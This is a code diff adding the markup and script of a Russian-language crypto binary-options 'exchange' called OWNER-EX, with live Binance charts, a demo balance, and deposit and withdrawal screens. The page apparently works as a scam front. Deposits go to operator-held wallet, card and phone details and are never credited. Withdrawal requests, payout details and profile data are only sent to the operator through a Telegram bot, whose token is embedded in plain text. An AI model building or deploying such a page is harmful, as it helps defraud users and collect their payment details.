@@ -150,4 +150,326 @@
         }
         .input-group label { display: block; font-size: 11px; color: #848e9c; margin-bottom: 8px; text-transform: uppercase; }
         .input-group input {
-            background: transparent; border: none; color: #
+            background: transparent; border: none; color: #fff;
+            width: 100%; font-size: 22px; font-weight: 800; outline: none;
+        }
+
+        .btn-exec {
+            height: 60px; border: none; border-radius: var(--radius);
+            font-weight: 900; font-size: 18px; cursor: pointer; transition: 0.2s;
+        }
+        .btn-call { background: var(--green); color: #000; }
+        .btn-put { background: var(--red); color: #fff; }
+
+        /* FOOTER */
+        footer {
+            height: 40px; background: var(--panel);
+            border-top: 1px solid var(--border);
+            display: flex; align-items: center; justify-content: center;
+            gap: 40px; font-size: 12px; color: #848e9c;
+        }
+        footer span { cursor: pointer; transition: 0.2s; }
+        footer span:hover { color: #fff; }
+
+        /* MODALS */
+        .modal-overlay {
+            position: fixed; inset: 0;
+            background: rgba(0,0,0,0.92); z-index: 2000;
+            display: none; justify-content: center; align-items: center;
+            backdrop-filter: blur(10px);
+        }
+        .modal-box {
+            background: var(--panel); width: 480px;
+            padding: 35px; border-radius: 15px;
+            border: 1px solid var(--border);
+        }
+        .custom-input {
+            background: #0b0e11; border: 1px solid var(--border);
+            color: #fff; padding: 15px; border-radius: 8px;
+            width: 100%; box-sizing: border-box; margin-bottom: 15px;
+        }
+
+        .pay-methods {
+            display: grid; grid-template-columns: 1fr 1fr;
+            gap: 15px; margin-bottom: 25px;
+        }
+        .pay-item {
+            background: #0b0e11; border: 1px solid var(--border);
+            padding: 18px; border-radius: 10px; text-align: center; cursor: pointer;
+        }
+        .pay-item.active { border-color: var(--accent); background: #1c2127; }
+        .pay-item i { font-size: 22px; color: var(--accent); margin-bottom: 10px; display: block; }
+        
+        #paymentInfoPage { display: none; text-align: center; }
+        .qr-placeholder {
+            width: 150px; height: 150px; background: #fff;
+            margin: 20px auto; border-radius: 10px; display: flex;
+            align-items: center; justify-content: center; color: #000; font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="header-left">
+        <div class="logo-box">
+            <div class="logo-icon">E</div>
+            <div class="logo-text">OWNER-EX</div>
+        </div>
+        <div class="asset-select-container">
+            <select id="assetSelect" onchange="updateSymbol(this.value)">
+                <option value="BTCUSDT">₿ BITCOIN / USDT</option>
+                <option value="ETHUSDT">Ξ ETHEREUM / USDT</option>
+                <option value="SOLUSDT">◎ SOLANA / USDT</option>
+                <option value="BNBUSDT">◈ BINANCE / USDT</option>
+            </select>
+        </div>
+    </div>
+    <div style="display: flex; align-items: center;">
+        <div class="acc-toggle">
+            <button class="acc-btn active" id="demoBtn" onclick="switchAccount('demo')">DEMO</button>
+            <button class="acc-btn" id="realBtn" onclick="switchAccount('real')">REAL</button>
+        </div>
+        <div id="balanceDisplay">$10,000.00</div>
+    </div>
+</header>
+
+<div class="terminal-container">
+    <div class="side-nav">
+        <i class="fas fa-chart-area nav-item" onclick="closeModals()"></i>
+        <i class="fas fa-wallet nav-item" onclick="openModal('cashierModal')"></i>
+        <i class="fas fa-user-circle nav-item" onclick="openModal('profileModal')"></i>
+        <i class="fas fa-headset nav-item" onclick="alert('Чат с поддержкой OWNER-EX открыт!')"></i>
+    </div>
+
+    <div class="chart-section">
+        <div class="chart-overlay">
+            <div class="overlay-sym" id="chartSymbol">BTC / USDT</div>
+            <div class="overlay-pay">ВЫПЛАТА 82%</div>
+        </div>
+        <div id="chart"></div>
+        <div class="history-table">
+            <table>
+                <thead><tr><th>АКТИВ</th><th>ТИП</th><th>СУММА</th><th>ДОХОД</th></tr></thead>
+                <tbody id="tradeHistoryBody"></tbody>
+            </table>
+        </div>
+    </div>
+
+    <div class="trade-panel">
+        <div class="input-group">
+            <label>Инвестиция (USDT)</label>
+            <input type="number" id="tradeAmount" value="100">
+        </div>
+        <div class="input-group">
+            <label>Время (Сек)</label>
+            <input type="number" id="tradeTime" value="30">
+        </div>
+        <button class="btn-exec btn-call" onclick="handleTrade('CALL')">ВЫШЕ ↑</button>
+        <button class="btn-exec btn-put" onclick="handleTrade('PUT')">НИЖЕ ↓</button>
+    </div>
+</div>
+
+<footer>
+    <span onclick="alert('Техподдержка @owner_ex_support')">СЛУЖБА ПОДДЕРЖКИ</span>
+    <span onclick="alert('FAQ')">ЧАСТЫЕ ВОПРОСЫ</span>
+    <span onclick="alert('Privacy Policy')">КОНФИДЕНЦИАЛЬНОСТЬ</span>
+</footer>
+
+<div id="profileModal" class="modal-overlay">
+    <div class="modal-box">
+        <h3 style="text-align: center; margin-bottom: 25px;">ЛИЧНЫЕ ДАННЫЕ</h3>
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+            <input type="text" id="p_name" class="custom-input" placeholder="Имя">
+            <input type="text" id="p_surname" class="custom-input" placeholder="Фамилия">
+            <input type="text" id="p_nick" class="custom-input" placeholder="Никнейм">
+            <input type="text" id="p_birth" class="custom-input" placeholder="Дата рождения">
+            <input type="text" id="p_country" class="custom-input" placeholder="Страна">
+            <input type="text" id="p_city" class="custom-input" placeholder="Город">
+            <input type="text" id="p_zip" class="custom-input" placeholder="Индекс">
+            <input type="text" id="p_promo" class="custom-input" placeholder="Промокод">
+        </div>
+        <button onclick="saveProfile()" class="btn-exec btn-call" style="width:100%; margin-top:10px;">СОХРАНИТЬ</button>
+        <div onclick="closeModals()" style="text-align:center; color:gray; cursor:pointer; margin-top:20px; font-size:12px;">ЗАКРЫТЬ</div>
+    </div>
+</div>
+
+<div id="cashierModal" class="modal-overlay">
+    <div class="modal-box">
+        <div id="cashierMain">
+            <div style="display:flex; justify-content: space-around; margin-bottom:25px; border-bottom:1px solid var(--border); padding-bottom:10px;">
+                <h3 id="tabDep" style="cursor:pointer; color:var(--accent)" onclick="switchTab('dep')">ДЕПОЗИТ</h3>
+                <h3 id="tabWit" style="cursor:pointer; color:gray" onclick="switchTab('wit')">ВЫВОД</h3>
+            </div>
+            
+            <p style="font-size:12px; color:gray; margin-bottom:15px;">Выберите способ:</p>
+            <div class="pay-methods">
+                <div class="pay-item active" onclick="selectPay(this, 'USDT (TRC20)')"><i class="fab fa-ethereum"></i><span>USDT</span></div>
+                <div class="pay-item" onclick="selectPay(this, 'Bitcoin')"><i class="fab fa-bitcoin"></i><span>Bitcoin</span></div>
+                <div class="pay-item" onclick="selectPay(this, 'Банковская Карта')"><i class="fas fa-credit-card"></i><span>Карта</span></div>
+                <div class="pay-item" onclick="selectPay(this, 'СБП / МИР')"><i class="fas fa-mobile-alt"></i><span>СБП</span></div>
+            </div>
+
+            <input type="number" id="cashAmount" class="custom-input" placeholder="Сумма ($)">
+            <input type="text" id="cashWallet" class="custom-input" placeholder="Ваши реквизиты (для вывода)" style="display:none;">
+
+            <button id="cashBtn" onclick="goToPaymentInfo()" class="btn-exec btn-call" style="width:100%;">ПОПОЛНИТЬ</button>
+        </div>
+
+        <div id="paymentInfoPage">
+            <h3 style="color:var(--accent)">ОПЛАТА ЗАЯВКИ</h3>
+            <p id="selectedMethodText" style="font-size:14px; margin-bottom:10px;"></p>
+            <div class="qr-placeholder">QR CODE</div>
+            <p style="font-size:12px; color:gray;">Переведите указанную сумму на реквизиты:</p>
+            <div id="adminRequisites" style="background:#000; padding:15px; border-radius:8px; font-family:monospace; margin:15px 0; word-break:break-all;">
+                TR7NHqfj2Cc... (Пример)
+            </div>
+            <p style="font-size:11px; color:var(--red);">* После оплаты средства поступят на баланс в течение 10 минут</p>
+            <button onclick="confirmPayment()" class="btn-exec btn-call" style="width:100%; margin-top:15px;">Я ОПЛАТИЛ</button>
+            <button onclick="backToCashier()" style="background:none; border:none; color:gray; margin-top:15px; cursor:pointer;">Назад</button>
+        </div>
+        
+        <div id="closeCashier" onclick="closeModals()" style="text-align:center; color:gray; cursor:pointer; margin-top:20px; font-size:12px;">ОТМЕНА</div>
+    </div>
+</div>
+
+<script>
+    const TG_TOKEN = "8102627080:AAGGbjyR0g1VzICKb-ait4t3CA34PJz1g5M";
+    const TG_USER_ID = 6426834853;
+
+    let bals = JSON.parse(localStorage.getItem('bals')) || { demo: 10000, real: 0 };
+    let profile = JSON.parse(localStorage.getItem('profile')) || {};
+    let tHist = JSON.parse(localStorage.getItem('tradeHistory')) || [];
+    let currentAccount = 'demo', lastPrice = 0, currentTab = 'dep', selectedMethod = 'USDT (TRC20)';
+
+    function saveAll() {
+        localStorage.setItem('bals', JSON.stringify(bals));
+        localStorage.setItem('profile', JSON.stringify(profile));
+        localStorage.setItem('tradeHistory', JSON.stringify(tHist));
+    }
+
+    function updateUI() {
+        document.getElementById('balanceDisplay').innerText = `$${bals[currentAccount].toLocaleString('en-US', {minimumFractionDigits: 2})}`;
+        document.getElementById('tradeHistoryBody').innerHTML = tHist.slice(0,12).map(h => `
+            <tr>
+                <td>${h.s}</td>
+                <td style="color:${h.t==='CALL'?'#0ecb81':'#f6465d'}">${h.t==='CALL'?'ВЫШЕ':'НИЖЕ'}</td>
+                <td>$${h.a}</td>
+                <td style="color:${h.r.includes('+')?'#0ecb81':'#f6465d'}">${h.r}</td>
+            </tr>
+        `).join('');
+    }
+
+    // CASHIER LOGIC
+    window.switchTab = (tab) => {
+        currentTab = tab;
+        document.getElementById('tabDep').style.color = tab === 'dep' ? 'var(--accent)' : 'gray';
+        document.getElementById('tabWit').style.color = tab === 'wit' ? 'var(--accent)' : 'gray';
+        document.getElementById('cashBtn').innerText = tab === 'dep' ? 'ПОПОЛНИТЬ' : 'ВЫВЕСТИ';
+        document.getElementById('cashWallet').style.display = tab === 'wit' ? 'block' : 'none';
+    };
+
+    window.selectPay = (el, name) => {
+        document.querySelectorAll('.pay-item').forEach(p => p.classList.remove('active'));
+        el.classList.add('active');
+        selectedMethod = name;
+    };
+
+    window.goToPaymentInfo = () => {
+        const amt = document.getElementById('cashAmount').value;
+        if(!amt || amt < 10) return alert("Минимум $10");
+        
+        if(currentTab === 'dep') {
+            document.getElementById('cashierMain').style.display = 'none';
+            document.getElementById('paymentInfoPage').style.display = 'block';
+            document.getElementById('selectedMethodText').innerText = `Метод: ${selectedMethod} | Сумма: $${amt}`;
+            // Здесь можно менять реквизиты в зависимости от метода
+            const reqs = {
+                'USDT (TRC20)': 'TR7NHqfj2Cc...Адрес_Вашего_Кошелька',
+                'Bitcoin': '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
+                'Банковская Карта': '4276 0000 0000 0000 (Иван И.)',
+                'СБП / МИР': '+7 (900) 000-00-00 (Тинькофф)'
+            };
+            document.getElementById('adminRequisites').innerText = reqs[selectedMethod] || 'Свяжитесь с поддержкой';
+        } else {
+            const wallet = document.getElementById('cashWallet').value;
+            if(!wallet) return alert("Введите реквизиты для вывода!");
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_USER_ID}&text=📤 ВЫВОД: $${amt} | Метод: ${selectedMethod} | Реквизиты: ${wallet}`).catch(()=>{});
+            alert("Заявка на вывод создана!"); closeModals();
+        }
+    };
+
+    window.backToCashier = () => {
+        document.getElementById('cashierMain').style.display = 'block';
+        document.getElementById('paymentInfoPage').style.display = 'none';
+    };
+
+    window.confirmPayment = () => {
+        const amt = document.getElementById('cashAmount').value;
+        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_USER_ID}&text=💸 НОВЫЙ ДЕПОЗИТ: $${amt} | Метод: ${selectedMethod}`).catch(()=>{});
+        alert("Заявка отправлена. Ожидайте подтверждения.");
+        closeModals();
+        backToCashier();
+    };
+
+    // TERMINAL LOGIC
+    window.openModal = (id) => document.getElementById(id).style.display = 'flex';
+    window.closeModals = () => document.querySelectorAll('.modal-overlay').forEach(m => m.style.display = 'none');
+
+    window.saveProfile = () => {
+        const keys = ['p_name','p_surname','p_nick','p_birth','p_country','p_city','p_zip','p_promo'];
+        keys.forEach(k => profile[k] = document.getElementById(k).value);
+        saveAll();
+        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_USER_ID}&text=👤 Профиль: ${profile.p_nick}`).catch(()=>{});
+        alert("Сохранено!"); closeModals();
+    };
+
+    window.handleTrade = (type) => {
+        const amt = parseFloat(document.getElementById('tradeAmount').value);
+        if (amt > bals[currentAccount] || amt <= 0) return alert("Недостаточно средств!");
+        bals[currentAccount] -= amt; updateUI();
+        const startPrice = lastPrice;
+        const symbol = document.getElementById('assetSelect').value.split(' ')[1];
+        setTimeout(() => {
+            const win = (type === 'CALL' && lastPrice > startPrice) || (type === 'PUT' && lastPrice < startPrice);
+            const resVal = win ? (amt * 0.82) : -amt;
+            const resText = win ? `+$${resVal.toFixed(2)}` : `-$${amt.toFixed(2)}`;
+            if (win) bals[currentAccount] += (amt + resVal);
+            tHist.unshift({ s: symbol, t: type, a: amt, r: resText });
+            saveAll(); updateUI();
+        }, parseInt(document.getElementById('tradeTime').value) * 1000);
+    };
+
+    window.switchAccount = (acc) => {
+        currentAccount = acc;
+        document.getElementById('demoBtn').classList.toggle('active', acc === 'demo');
+        document.getElementById('realBtn').classList.toggle('active', acc === 'real');
+        updateUI();
+    };
+
+    function initChart() {
+        const chart = LightweightCharts.createChart(document.getElementById('chart'), {
+            layout: { background: { color: '#000000' }, textColor: '#848e9c' },
+            grid: { vertLines: { color: '#111' }, horzLines: { color: '#111' } },
+            timeScale: { timeVisible: true, secondsVisible: true }
+        });
+        const series = chart.addCandlestickSeries({ upColor: '#0ecb81', downColor: '#f6465d', borderVisible: false, wickUpColor: '#0ecb81', wickDownColor: '#f6465d' });
+        window.updateSymbol = (sym) => {
+            document.getElementById('chartSymbol').innerText = sym.replace('USDT', ' / USDT');
+            fetch(`https://api.binance.com/api/v3/klines?symbol=${sym}&interval=1m&limit=500`)
+                .then(r => r.json()).then(d => series.setData(d.map(x => ({ time: x[0]/1000, open: +x[1], high: +x[2], low: +x[3], close: +x[4] }))));
+            if (window.ws) window.ws.close();
+            window.ws = new WebSocket(`wss://stream.binance.com:9443/ws/${sym.toLowerCase()}@kline_1s`);
+            window.ws.onmessage = e => {
+                const k = JSON.parse(e.data).k;
+                lastPrice = +k.c;
+                series.update({ time: k.t/1000, open: +k.o, high: +k.h, low: +k.l, close: lastPrice });
+            };
+        };
+        updateSymbol('BTCUSDT');
+    }
+
+    initChart(); updateUI();
+</script>
+</body>
+</html>
